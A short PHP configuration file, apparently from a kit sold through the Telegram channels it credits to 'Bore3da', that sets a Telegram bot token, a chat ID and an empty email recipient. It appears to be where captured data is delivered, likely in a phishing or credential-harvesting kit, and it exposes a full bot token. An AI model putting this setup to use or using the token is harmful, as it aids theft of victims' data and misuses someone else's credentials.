<?php
/**

 * Group Chat   :   https://t.me/bore3da_chat 
 * @telegram   :   @Bore3da 
 * Project Name:   SG 2024
 * Author      :   Bore3da

 * channel Telegram  :  https://t.me/bore3dashop
 */

// telegram

$chat_id = "-1002107410386";
$bot_token = "6786948253:AAFmpIALBLHSmiJ2R66zJXDyBk62XvK5-jg";
// email
$to = '';


?>